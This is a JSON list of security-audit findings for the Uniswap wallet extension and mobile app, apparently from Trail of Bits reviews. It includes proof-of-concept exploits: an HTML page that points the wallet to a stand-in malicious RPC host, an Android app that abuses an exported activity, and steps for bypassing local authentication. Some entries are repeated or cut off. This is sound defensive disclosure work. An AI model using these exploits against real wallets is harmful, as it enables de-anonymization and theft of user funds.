        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension stores redux data in Chromes local storage (via the redux-persist library). The data is used by all components (including the background service worker) and is not authenticated. It may be modied by a compromised content script. The redux-persist library keeps data in the storage under the persist:root key. The data is not condential and contains information such as the following:  Wallet metadata: accounts public addresses, wallet names, the derivation index, and settings such as the swap protection switch  Connected dapps metadata: URLs, connected accounts, current address, last chain ID  Alerts: Booleans controlling sidebar behavior  The librarys metadata: version and rehydration status Exploit Scenario Alice visits a malicious website, which exploits Chromes renderer process and gains full access to the extensions content script. The malicious website uses the content script to modify the redux state in the local storage. The website then adds itself to connected dapps, changes Alices wallet name and addresses, and conducts a phishing attack with the help of modied data. Recommendations Short term, authenticate redux storage kept in Chromes local storage. The authentication key should be stored in Chromes session storage, as this is not accessible to content scripts.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "30. Local storage may be evicted ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap mobile wallet uses Chromes local storage to keep encrypted mnemonics and encrypted private keys. The local storage may be evicted under heavy memory pressure, as indicated by the ocial documentation. Exploit Scenario Alice uses the Chrome browser for memory-intensive tasks. The browser extensions local storage is evicted. Alice loses her private keys. Recommendations Short term, make the wallet inform users about the possibility of data loss. Emphasize that the data eviction may happen without any user interaction. Alternatively, make the wallet request the unlimitedStorage permission or call the navigator.storage.persist methodthese actions should prevent Chrome from clearing the extensions storage.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "31. Password stored in cleartext in session storage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension stores user passwords in session storage. The password is stored in cleartext only when the wallet is unlocked and inaccessible to content scripts. Instead of storing a cleartext password, the extension could store its hashor rather, a key derived from the password with a key derivation function (KDF). This change would bring two benets:  Mitigate password reuse attacks. If the password is stolen and the user uses the same password on multiple systems, the stolen one would allow attackers to compromise other systems. If the password was derived using a KDF, attackers would have to crack the hash rst.  Mitigate timing attacks. It would be harder to disclose information because the attacker would not have full control over the hash. Currently, the code is vulnerable to a timing attack (gure 31.1), though it is probably not exploitable because the password cannot be programmatically controlled. async checkPassword(password: string): Promise<boolean> { const currentPassword = await this.session.getItem(passwordKey) return currentPassword === password } Figure 31.1: Password comparison is not constant time. (universe/packages/wallet/src/ features/wallet/Keyring/Keyring.web.ts#8588) Exploit Scenario Eve steals Alices password from the Uniswap wallet browser extension. Eve uses the password on other systems such as email providers and social networks, compromising many of Alices accounts. Recommendations Short term, make the extension store the key derived from a password, instead of the password itself, in the session storage. Fix the timing attack vulnerability shown in gure 31.1 by replacing the unsafe comparison with a constant-time comparison of derived keys. Unfortunately, Web Crypto does not come with a constant-time comparison algorithm for strings, and JavaScript may optimize-out simple algorithms like an XOR loop (see the References below). However, storing a hash (a derived key) instead of a password and comparing it in non-constant time would be secure enoughan attacker would not have control over the hash and could learn only the rst few characters of it. References  Soatoks Guide to Side-Channel Attacks",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "32. Use of RSA ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension uses the RSA algorithm with OAEP to encrypt mnemonics in the Scantastic protocol. While the RSA-OAEP from Web Crypto should be secure, we recommend not using RSA and instead using modern alternatives like hybrid public key encryption (HPKE) or Elliptic Curve Integrated Encryption Scheme (ECIES). These schemes allow arbitrary-length plaintexts, produce shorter ciphertexts, are less error-prone to implement, and come with interoperable implementations. Recommendations Short term, consider replacing RSA-OAEP with HPKE or ECIES. For example, switch to the Libsodium sealed boxes algorithm. We do not recommend switching to libraries that are not audited or not widely used. Long term, revisit this nding when designing new features that will depend on asymmetric cryptography. References  Seriously, stop using RSA 33. Insu\u0000cient guidance, lack of validation, and unexpected behavior in Scantastic protocol Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-UNIEXT-33 Target: Scantastic protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "34. Local authentication bypass ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The manual modication of the isUnlocked variable in chrome.storage allows bypassing the sidebar's local authentication; however, this behavior does not allow conducting sensitive operations, such as revealing recovery phrases, changing the local password, or adding a wallet. To reproduce the issue, install the Storage Area Explorer Chrome extension, and then follow these steps: 1. Open the Uniswap wallet browser extension and provide the incorrect password (gure 34.1). Figure 34.1: The rst step to bypass local authentication is providing the wrong password. 2. Open Chromes Inspect tool in the sidebar, then go to the \"Storage Explorer tab, and edit the isUnlocked variable to true in the reduxed key (gure 34.2). Figure 34.2: Manual modication of the isUnlocked variable 3. Click Forgot password in the Uniswap browser extension and then enter the recovery phrase. The wallet should be immediately unlocked. Figure 34.3: Unlocked wallet Exploit Scenario A user experiments with the Uniswap wallet browser extension and discovers that modifying a single parameter grants unauthenticated access to his wallet. This compromises the user's condentiality on Uniswap. Recommendations Short term, change the behavior of the wallet to reveal the authenticated view of the wallet only when a user provides the correct password. Long term, periodically test how manual modication of specic parameters in the reduxed key (e.g., using the Storage Area Explorer Chrome extension) aects the wallets behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "35. Chrome storage is not properly cleared after removing a recovery phrase ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "When a user removes the recovery phrase in the Uniswap wallet browser extension, the mnemonic and private keys remain in chrome.storage. To reproduce the issue, initialize a new wallet in the browser extension. Then use the Remove recovery phrase functionality and create a new wallet. After initializing another wallet, use the Storage Area Explorer Chrome extension to see that the com.uniswap.web.mnemonic and com.uniswap.web.privateKey keys of the removed wallet still exist in chrome.storage. Exploit Scenario Convinced of Uniswap softwares condentiality, Bob uses a specic wallet for anonymous transactions. After completing his transactions, he removes the recovery phrase from his wallet, assuming the mnemonic no longer exists in his browser. However, the mnemonic still remains stored in chrome.storage. An attacker, Eve, gains access to Bob's chrome.storage and can easily prove that Bob owned the specic wallet. Recommendations Short term, ensure that the Remove recovery phrase functionality removes the mnemonic and privateKey keys from chrome.storage. Long term, periodically test how specic functionalities in the browser extension aect the wallets chrome.storage (e.g., using the Storage Area Explorer Chrome extension).",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "36. Unisolated components in the setupReduxed conguration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension uses no options when setting up Reduxed Chrome Storage (gure 36.1). The setupReduxed function in the reduxed-chrome-storage library contains the isolated option, and the reduxed-chrome-storage documentation states the following: Check this option if your store in this specic extension component isn't supposed to receive state changes from other extension components. It is recommended to always check this option in Manifest V3 service worker and all extension-related pages (e.g. options page etc.) except popup page. export const reduxedSetupOptions: ReduxedSetupOptions = {} Figure 36.1: Options passed when setting up Reduxed Chrome Storage (universe/apps/stretch/src/background/store.ts#27) Recommendations Short term, consider enabling the isolated option to ensure no other extension components will unpredictably aect the current store in case of further extension development.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Missing message authentication in content script ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Ethereum API creates two event listeners: one in the initExtensionToDappOneWayListener function and one in the sendRequestAsync function. Neither listener validates the events source. A malicious dapp can post a message to a website with a dierent origin and the message will be accepted. private initExtensionToDappOneWayListener = (): void => { const handleDappRequest = async (event: MessageEvent<BaseExtensionRequest>): Promise<void> => { const messageData = event.data {...omitted for brevity...} } // This listener isn't removed because it's needed for the lifetime of the app // TODO: Check for active tab when listening to events window.addEventListener('message', handleDappRequest) } Figure 19.1: The initExtensionToDappOneWayListener function does not authenticate the source of the event. (universe/apps/stretch/src/contentScript/InjectedProvider.ts#123144) function sendRequestAsync<T extends BaseDappResponse>( request: BaseDappRequest, responseType: T['type'], timeoutMs = ONE_HOUR_MS ): Promise<T | ErrorResponse> { return new Promise((resolve, reject) => { {...omitted for brevity...} const handleDappRequest = (event: MessageEvent<any>): void => { const messageData = event.data if ( messageData?.requestId === request.requestId && isValidMessage<T | ErrorResponse>( [responseType, DappResponseType.ErrorResponse], messageData ) ) { {...omitted for brevity...} } } window.addEventListener('message', handleDappRequest) {...omitted for brevity...} }) } Figure 19.2: The sendRequestAsync function does not authenticate the source of the event; it checks only the requestId, which can be guessed or snied by malicious websites. (universe/apps/stretch/src/contentScript/InjectedProvider.ts#563595) Exploit Scenario Alice opens a malicious website and clicks a button. The website opens a new window with the Uniswap application. The website then sends a SwitchChain message to Uniswap. The message contains a URL for a malicious JSON RPC provider. Uniswaps Ethereum API accepts the message and changes the RPC provider. Alice uses the Uniswap website with the attacker-controlled JSON RPC provider. The website displays Alice's data incorrectly. Moreover, the attacker knows Alices IP address and wallet address and can de-anonymize her. The exploit proof of concept is shown in gure 19.3. <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <title>Uniswap extension - TOB-UNIEXT-16</title> </head> <body> <div id=\"button\">Button</div> <div id=\"result\">result</div> <style type=\"text/css\"> #button { height: 200px; width: 200px; border: 1px solid red; } </style> <script type=\"text/javascript\"> let new_window = null; button.onclick = async () => { (async () => { try { await poc(); } catch(err) { console.error(err); } })() }; async function poc() { try { console.log('Start TOB-UNIEXT-16 PoC'); new_window = open('https://app.uniswap.org/') await new Promise(r => setTimeout(r, 4000)); console.log('Sending msg'); new_window.postMessage({'type': 'SwitchChain', 'chainId': -1, 'providerUrl': {'url': 'https://malicious-infura.example.com'} }, '*'); // wait for requests or manually execute code below in the new window // window.ethereum.request({'method': 'eth_blockNumber'}); } catch (err) { console.error(err); } } </script> </body> </html> Figure 19.3: Proof-of-concept exploit Recommendations Short term, add the missing events source authentication to the initExtensionToDappOneWayListener and sendRequestAsync functions to ensure that event.source === window before the functions process any messages. If the listeners described in the nding should handle messages only from the extension and should not handle requests from the website, then use the Chrome messaging API (chrome.runtime.onMessage.addListener) instead of the events API (window.addEventListener). This change would require implementing the recommendations from TOB-UNIEXT-16. Long term, document authentication and data validation requirements for all message- passing logic in the extension.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "20. Data displayed for user conrmation may di\u0000er from actually signed data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension changes transaction details after user conrmation. The extension calls the populateTransaction method, which receives data from a remote server (provider) and updates the transaction with that data. Users cannot manually validate and conrm the updated transaction before signing. The issue occurs in functionalities that use the signAndSendTransaction method but may also exist in other functionalities. const hexRequest = hexlifyTransaction(request) const populatedRequest = await connectedSigner.populateTransaction(hexRequest) const signedTx = await connectedSigner.signTransaction(populatedRequest) const transactionResponse = await provider.sendTransaction(signedTx) Figure 20.1: Part of the signAndSendTransaction method (universe/packages/wallet/ src/features/transactions/sendTransactionSaga.ts#7881) Transaction data populated by the populateTransaction method includes the following:  Transactions destination address translated from an ENS name  Gas price  Gas limit  Max fee per gas  Nonce Exploit Scenario Alice creates a transaction with the Uniswap wallet. She species the destination as the vitalik.eth ENS name. She reviews the transaction in the wallets sidebar and conrms it. The wallet resolves the ENS name with the Infura provider. The provider was recently breached and maliciously resolves the name to the attackers address. Alice unwillingly sends tokens to the attacker. Recommendations Short term, modify the code to display populated transactions to users in the extensions sidebar before asking them for conrmation. Users should be able to see exactly what the wallet will sign after their conrmation. Because the transaction details may need frequent updates, the wallet may need to periodically pull fresh data until the users conrmation. The sidebar should block the conrmation button for a few seconds after every transaction update. Long term, hard code baseline data for gas and fees and warn users if the remote data is distant from this baseline. This recommendation will help users detect malfunctioning providers.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "32. Use of RSA ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension uses the RSA algorithm with OAEP to encrypt mnemonics in the Scantastic protocol. While the RSA-OAEP from Web Crypto should be secure, we recommend not using RSA and instead using modern alternatives like hybrid public key encryption (HPKE) or Elliptic Curve Integrated Encryption Scheme (ECIES). These schemes allow arbitrary-length plaintexts, produce shorter ciphertexts, are less error-prone to implement, and come with interoperable implementations. Recommendations Short term, consider replacing RSA-OAEP with HPKE or ECIES. For example, switch to the Libsodium sealed boxes algorithm. We do not recommend switching to libraries that are not audited or not widely used. Long term, revisit this nding when designing new features that will depend on asymmetric cryptography. References  Seriously, stop using RSA",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "33. Insu\u0000cient guidance, lack of validation, and unexpected behavior in Scantastic protocol ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "We identied four minor issues in the Scantastic protocol related to insucient user instructions, lack of validation of keys, and unexpected behavior in the protocols general ow that could lead to user confusion and enable various phishing attacks. We recommend the following xes to mitigate these issues:",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "34. Local authentication bypass ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The manual modication of the isUnlocked variable in chrome.storage allows bypassing the sidebar's local authentication; however, this behavior does not allow conducting sensitive operations, such as revealing recovery phrases, changing the local password, or adding a wallet. To reproduce the issue, install the Storage Area Explorer Chrome extension, and then follow these steps:",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "37. Lack of global error listener ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension congures the global change listener but does not congure the global error listener (gure 37.1). const listeners: ReduxedSetupListeners = { onGlobalChange: globalChangeListener, } const instantiateStore = setupReduxed(storeCreatorContainer, reduxedSetupOptions, listeners) Figure 37.1: The Reduxed Chrome Storage setup with listeners (universe/apps/stretch/src/background/index.ts#4751) However, the reduxed-chrome-storage library allows specifying an error listener that will run a function whenever an error occurs during the chrome.storage update. Recommendations Short term, implement the error listener to ensure the wallet will behave predictably when an error occurs during the chrome.storage update. A function in the error listener should inform a user to take appropriate steps to resolve an issue with the local storage (e.g., to back up their passphrase and reinstall the browser extension). A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Use of improperly pinned GitHub Actions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The GitHub Actions workows use several third-party actions pinned to a tag or branch name instead of a full commit SHA. This conguration enables repository owners to silently modify the actions. A malicious actor could use this ability to tamper with an application release or leak secrets. 17 18 // (...) 61 - name: Build dev folder uses: borales/actions-yarn@v4 --clientSecret ${{ secrets.CI_GOOGLE_CLIENT_SECRET }} Figure 1.1: The borales/actions-yarn action pinned only to a tag ([redacted]) 27 28 29 30 - name: Create Pull Request uses: peter-evans/create-pull-request@v3 with: token: ${{ secrets.SERVICE_ACCOUNT_PAT }} Figure 1.2: The peter-evans/create-pull-request action pinned only to a tag ([redacted]) 44 45 46 uses: peter-evans/create-pull-request@v3 with: token: ${{ secrets.SERVICE_ACCOUNT_PAT }} Figure 1.3: The peter-evans/create-pull-request action pinned only to a tag ([redacted]) Exploit Scenario An attacker gains unauthorized access to the account of a GitHub Actions owner. The attacker manipulates the actions code to secretly insert a backdoor. As a result, the hidden code is subsequently injected into the nal version of the product, which remains undetected by the end users. Recommendations Short term, pin each third-party action to a specic full-length commit SHA, as recommended by GitHub.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Password policy issues on wallet backup with Google Drive ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "When a user is creating a wallet with a backup using Google Drive, the Uniswap application requires that the password be at least eight characters long. This is a secure requirement; however, the application does not verify (or at least warn users about using) passwords that are low entropy or are composed of a small set of characters (e.g., aaaaaaaa). Also, rampant password reuse would trivialize the eort required to decrypt wallets in the event of a back-end breach. Recent research indicates that 62% of users reuse passwords across multiple sites. Many of those reused passwords are likely to have been leaked by unrelated hacks, allowing credential stuers to purchase those credentials and theoretically decrypt wallets at little expense. Exploit Scenario A victim sets up a wallet using the backup Google Drive and password 12345678. The attacker gets unauthorized access to the victims Google Drive and then can easily decrypt the Uniswap wallet using a common password wordlist, which leads to stolen funds. Recommendations Short term, consider using specic properties for password elds that will allow an OS to auto-generate strong passwords. From a UI perspective, implement a password strength meter to help users set a stronger password. Long term, implement the Have I Been Pwned (HIBP) API in the wallet to check user passwords against publicly known passwords. If a password chosen by a user has been compromised, the wallet should inform the user and require the user to choose a new one.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Innite errors loop when the QR code is invalid ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "Upon scanning a QR code encoded with data that is inconsistent with the set logic for the Uniswap mobile applicationsuch as having an invalid URI (gure 3.1)the application responds with an error message (gure 3.2). The try again feature does not work as intended, so it is not possible to turn o this error message. As a result, the user is left with no option but to restart the application. Figure 3.1: Example QR code with the encoded && 1=1/* string Figure 3.2: Error message upon scanning an invalid QR code Recommendations Short term, x the application so that it handles the error correctly. The try again button should allow a user to scan a QR code again. Long term, extend the testing suite with the collection of potentially invalid or malicious QR codes. References  MalQR: A collection of malicious QR codes and barcodes",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Static AES-GCM nonce used for cloud backup encryption ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The cloud backup feature of the Uniswap mobile wallet allows users to store encrypted mnemonics in the Google Drive application data folder. AES-GCM cipher mode is used for the encryption. The mode requires a unique, random nonce for every encryption operation. However, the Uniswap mobile wallet uses a constant nonce of 16 zeros. The vulnerable nonce generation is highlighted in gure 4.1. fun encrypt(secret: String, password: String, salt: String): String { val key = keyFromPassword(password, salt) val cipher = Cipher.getInstance(\"AES/GCM/NoPadding\") cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, \"AES\"), IvParameterSpec(ByteArray(16))) val encrypted = cipher.doFinal(secret.toByteArray(Charsets.UTF_8)) return Base64.encodeToString(encrypted, Base64.DEFAULT) } Figure 4.1: AES-GCM encryption called by the backupMnemonicToCloudStorage function ([redacted]) While using constant nonces with AES-GCM is usually a critical vulnerability, the impact of the bug is reduced in the context of the Uniswap mobile wallet because the encryption key changes before every encryption. The key is derived from a password and a random salt, as shown in gures 4.1 and 4.2. val encryptionSalt = generateSalt(16) val encryptedMnemonic = withContext(Dispatchers.IO) { encrypt(mnemonic, password, encryptionSalt) } Figure 4.2: Part of the backupMnemonicToCloudStorage function ([redacted]) If the encryption key had been reused, the following attacks would be possible:  Authentication key recovery: The sub-key of the encryption key used for ciphertext authentication could be recovered from a few ciphertexts. This would allow an attacker to modify ciphertext in a meaningful way and recompute a valid authentication tag for the new version.  Reuse of keystream: The XOR of two ciphertexts would result in the XOR of two plaintexts. Given such data, an attacker could perform statistical analysis to recover both plaintexts. Exploit Scenario 1 In future releases of the Uniswap mobile wallet, the random salt is reused in a few subsequent encryptions. Users upload their mnemonics encrypted with a key that is the same for a few ciphertexts. The encrypted mnemonics are stolen from Google Drive and XORed pairwise. The criminals perform statistical analysis and obtain mnemonics in plaintext. They steal all users tokens. Exploit Scenario 2 Users reverse-engineer the Uniswap mobile wallet and learn that a constant nonce is used for AES-GCM encryption of backups. They publicly discuss this information on X (Twitter). Uniswaps credibility is negatively impacted. Recommendations Short term, replace the constant 16-byte nonce with a randomly generated, unique nonce in the encrypt function. Consider using nonces that are 12 bytes long instead of 16 bytes, as this length is more standard. Ensure that a strong, cryptographically secure pseudorandom number generator is used. Long term, create an inventory of ciphers and cryptographic parameters used in the Uniswap mobile wallet. An inventory could easily catch vulnerabilities like weak parameters or incorrect generation of certain cryptographic data. The inventory must be kept up-to-date to be useful, so an internal process should be created for that task. For example, any pull request changing cryptographic code should include an update to the inventory. Moreover, the inventory should be periodically compared to the current cryptographic standards. References  Antoine Joux, Authentication Failures in NIST version of GCM 5. Argon2i algorithm is used instead of Argon2id Severity: Low Diculty: High Type: Cryptography Finding ID: TOB-UNIMOB2-5 Target: Uniswap Android application, cloud backups",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "6. Errors from cryptographic operations contain too much information ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap mobile wallet should limit the amount of information about cryptographic failures. Providing too much detail on failures may allow attackers to extract valuable information about plaintexts and to, for example, mount a padding oracle attack. While we have not observed any exploitable vulnerability in the wallet, the restoreMnemonicFromCloudStorage function, which decrypts AES-GCM encrypted cloud backups, is too verbose. The function returns three dierent errors, depending on the type of exception returned from the decrypting routine. try { decryptedMnemonics = withContext(Dispatchers.IO) { decrypt(encryptedMnemonic, password, encryptionSalt) } } catch (e: BadPaddingException) { Log.e(\"EXCEPTION\", \"${e.message}\") promise.reject( CloudBackupError.BACKUP_INCORRECT_PASSWORD_ERROR.value, \"Incorrect decryption password\" ) } catch (e: IllegalBlockSizeException) { Log.e(\"EXCEPTION\", \"${e.message}\") promise.reject( CloudBackupError.BACKUP_DECRYPTION_ERROR.value, \"Incorrect decryption password\" ) } catch (e: Exception) { Log.e(\"EXCEPTION\", \"${e.message}\") promise.reject( CloudBackupError.BACKUP_DECRYPTION_ERROR.value, \"Failed to decrypt mnemonics\" ) } Figure 6.1: Various errors returned by the restoreMnemonicFromCloudStorage function ([redacted]) Recommendations Short term, have the restoreMnemonicFromCloudStorage function handle all cryptographic errors uniformly. Long term, do a manual review to ensure that the application does not leak information via verbose cryptographic errors. Create a peer review policy that will ask reviewers to catch too verbose cryptographic errors. References  CVE-2019-1559: An example vulnerability whose root cause was that the vulnerable application responded dierently to various decryption errors",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Device-to-device backups are not disabled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap mobile wallet does not disable local device-to-device transfers. Encrypted shared preferences may be shared with other devices. While the wallet disables backups to Google Drive with the allowBackup ag, the newer Android version (Android 12/API level 31 and higher) does not disable device-to-device transfers with this ag. Exploit Scenario 1 An adversary gains temporary physical access to a phone. He initiates a device-to-device transfer and copies the Uniswap mobile wallets encrypted shared preferences to his device. Then he puts the phone back in place so the victim does not notice the incident. The adversary performs an oine brute-force attack and obtains the users private keys. Exploit Scenario 2 A user copies all his data to a new device with a local device-to-device transfer. The old Uniswap mobile wallets encrypted shared preferences are transferred. The user installs the wallet on the new phone. The wallet application fails to start because it cannot decrypt the copied shared preferences, as the encryption master key stored in the devices Key Store is new. The user gets angry, and Uniswaps reputation is damaged. Recommendations Short term, disable device-to-device transfers. To do this, add the android:dataExtractionRules ag to the Android Manifest pointing to a le with a <device-transfer> section. Add the android:fullBackupContent ag to support older API levels. Long term, follow new features of Android and make sure that the Uniswap wallet application deals with them correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Overly broad permission requests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The application requests the android.permission.SYSTEM_ALERT_WINDOW permission (gure 8.1), which appears to be broader than warranted by the respective functionalities of the application. The SYSTEM_ALERT_WINDOW permission is of concern because it has often been exploited; it enables an application to display over any other application without notifying the user, such as fraudulent ads or persistent screens. The Android documentation states, Very few apps should use this permission; these windows are intended for system-level interaction with the user. Furthermore, if the application targets API level 23 or higher, the user must explicitly grant this permission to the application through a permission management screen. <uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/> Figure 8.1: The AndroidManifest.xml le in the Uniswap production release APK Exploit Scenario An attacker nds a way to use the SYSTEM_ALERT_WINDOW permission and prepares a tapjacking exploit. The attacker crafts a deceptive overlay on the users device that tricks the user into thinking they are interacting with a legitimate function of the application. The user unknowingly triggers the action to send funds under the attackers control. This results in the theft of the users funds. Recommendations Short term, remove the SYSTEM_ALERT_WINDOW permission. Long term, review the permissions required by the wallet and remove any permissions that the application does not need. Make an inventory of the required permissions with explanations of why they are needed.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Transaction amounts are obscured and lazily validated in initial views ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The initial view (screen) of a new transaction and swap enables users to manually provide an amount to transfer. The amount is validated and cached if validation succeeds. The cached amount is used by the application even if the amount is changed to an arbitrary string (even an invalid one). This issue may allow adversaries to trick users into sending other amounts of tokens than the users wanted to send. On the left of gure 9.1 is the initial view of a transaction where the number 2 was typed and later replaced with 1 whitespaces are not visible. The user sees the converted USD value for the correct number 2. Also, the user is shown the number 2 in the review transaction screen in the following gure. 2. The user sees only the number 1, as Figure 9.1: Two screenshots, the initial view and the review transaction screen Exploit Scenario Alice tricks Bob into copy-pasting an amount string with whitespaces to a transaction screen. Bob sees a small amount that he is willing to transfer to Alice and fails to validate the converted USD amount, which does not match the small amount. Bob also fails to validate the amount on the next screen and signs the transaction with a large amount of tokens. Recommendations Short term, validate amount strings after any changes and do not allow users to proceed with a transaction if the amount string is not valid. That is, instead of caching the last valid amount, always use the string that the user is shown on the screen. Long term, ensure that on all screens with external data, the data shown to the user is exactly the same as that used by the application. In other words, what the user sees is what the application uses. Take special care with whitespaces, special characters, and UTF-8 encoded strings.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Potentially insecure exported NoticationOpenedReceiver activity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The com.onesignal.NotificationOpenedReceiver activity in Uniswaps Android mobile wallet is exported (gure 10.1) and could allow access to internal components of the Uniswap mobile wallet. For example, the exported NotificationOpenedReceiver activity can behave as a proxy for the unexported content providers. <activity android:theme=\"@android:style/Theme.Translucent.NoTitleBar\" android:name=\"com.onesignal.NotificationOpenedReceiver\" android:exported=\"true\" android:taskAffinity=\"\" android:excludeFromRecents=\"true\" android:noHistory=\"true\"/> Figure 10.1: The exported activity in the AndroidManifest.xml le The following proof-of-concept application (gure 8.2) calls the exported com.onesignal.NotificationOpenedReceiver activity. It then tries to access the unexported com.uniswap.FileSystemFileProvider provider because the provider has granted URI permissions (gure 8.3), so it is possible to use the content:// URI scheme (gure 8.2, line 26). Even though we were unable to steal any Uniswap mobile wallet internal les during the audit, it proves that they are reachable from the perspective of a malicious application on the same device. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package com.example.myexploit import android.content.Intent import android.os.Bundle import androidx.activity.ComponentActivity const val BUNDLE_KEY_ACTION_ID = \"actionId\" const val BUNDLE_KEY_ANDROID_NOTIFICATION_ID = \"androidNotificationId\" const val BUNDLE_KEY_ONESIGNAL_DATA = \"onesignalData\" class MainActivity : ComponentActivity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) val intent = Intent(\"android.intent.action.VIEW\") intent.setClassName( \"com.uniswap\", \"com.onesignal.NotificationOpenedReceiver\" ) intent.putExtra(BUNDLE_KEY_ACTION_ID, 123) 20 21 22 23 24 25 26 intent.putExtra(\"summary\", \"abc\") intent.putExtra(BUNDLE_KEY_ANDROID_NOTIFICATION_ID, 1337111) intent.putExtra(\"action_button\", false) intent.putExtra(\"dismissed\", false) intent.putExtra(\"grp\", \"whatever\") val myString = \"{ \\\"alert\\\": \\\"Test Msg\\\", \\\"custom\\\": { \\\"i\\\": \\\"UUID\\\", \\\"u\\\": \\\"content://com.uniswap.FileSystemFileProvider/expo_files/\\\" } }\" intent.putExtra(BUNDLE_KEY_ONESIGNAL_DATA, myString) startActivity(intent) 27 28 29 30 } } Figure 10.2: A proof of concept that uses the exported activity and unexported le system provider <provider android:name=\"expo.modules.filesystem.FileSystemFileProvider\" android:exported=\"false\" android:authorities=\"com.uniswap.FileSystemFileProvider\" android:grantUriPermissions=\"true\"> Figure 10.3: The unexported provider with the URI permissions granted The issue was discussed in a OneSignal GitHub issue when the 